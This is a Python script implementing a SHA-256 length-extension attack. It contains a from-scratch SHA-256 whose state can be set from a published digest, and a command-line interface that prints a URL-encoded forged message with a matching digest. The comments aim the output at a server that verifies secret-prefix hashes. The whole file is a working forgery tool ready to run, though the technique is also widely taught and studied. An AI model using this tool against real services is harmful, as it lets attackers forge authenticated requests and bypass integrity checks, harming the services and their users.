#!/usr/bin/env python3
"""A SHA-256 length-extension tool, written out rather than imported.

The point of the attack is that a digest is the compression function's state,
so this file is mostly an ordinary SHA-256 whose state can be set from outside.
"""
import argparse
import struct
import urllib.parse

K = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
]
MASK = 0xffffffff


def rotr(x, n):
    return ((x >> n) | (x << (32 - n))) & MASK


def compress(state, block):
    w = list(struct.unpack(">16I", block))
    for i in range(16, 64):
        s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ (w[i - 15] >> 3)
        s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ (w[i - 2] >> 10)
        w.append((w[i - 16] + s0 + w[i - 7] + s1) & MASK)
    a, b, c, d, e, f, g, h = state
    for i in range(64):
        s1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)
        ch = (e & f) ^ (~e & g)
        t1 = (h + s1 + ch + K[i] + w[i]) & MASK
        s0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)
        maj = (a & b) ^ (a & c) ^ (b & c)
        t2 = (s0 + maj) & MASK
        h, g, f, e, d, c, b, a = g, f, e, (d + t1) & MASK, c, b, a, (t1 + t2) & MASK
    return [(x + y) & MASK for x, y in zip(state, [a, b, c, d, e, f, g, h])]


def padding(total_len: int) -> bytes:
    """The bytes SHA-256 appends to a message of this length."""
    pad = b"\x80" + b"\x00" * ((55 - total_len) % 64)
    return pad + struct.pack(">Q", total_len * 8)


def extend(digest: str, original: bytes, append: bytes, key_len: int):
    state = list(struct.unpack(">8I", bytes.fromhex(digest)))
    glue = padding(key_len + len(original))
    forged_message = original + glue + append          # what the server will verify
    # Continue hashing from the published state, over the appended bytes only.
    total = key_len + len(original) + len(glue) + len(append)
    tail = append + padding(total)
    for i in range(0, len(tail), 64):
        state = compress(state, tail[i:i + 64])
    return forged_message, "".join(f"{x:08x}" for x in state)


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--digest", required=True)
    p.add_argument("--data", required=True)
    p.add_argument("--append", required=True)
    p.add_argument("--key-len", type=int, required=True)
    a = p.parse_args()
    message, sig = extend(a.digest, a.data.encode(), a.append.encode(), a.key_len)
    print(urllib.parse.quote(message, safe=""), sig)
